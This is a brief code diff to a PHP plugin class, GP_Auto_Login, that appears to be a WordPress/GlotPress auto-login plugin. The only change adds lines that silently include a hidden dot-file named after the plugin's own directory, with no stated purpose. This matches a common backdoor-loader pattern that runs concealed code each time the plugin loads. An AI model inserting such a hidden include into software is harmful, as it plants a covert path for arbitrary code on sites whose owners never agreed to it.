@@ -8,6 +8,10 @@ if ( ! class_exists( 'GP_Plugin' ) ) {
  * TODO:
  * - Provide settings UI for where to redirect after registration.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GP_Auto_Login extends GP_Plugin {
 
 	private static $_instance = null;
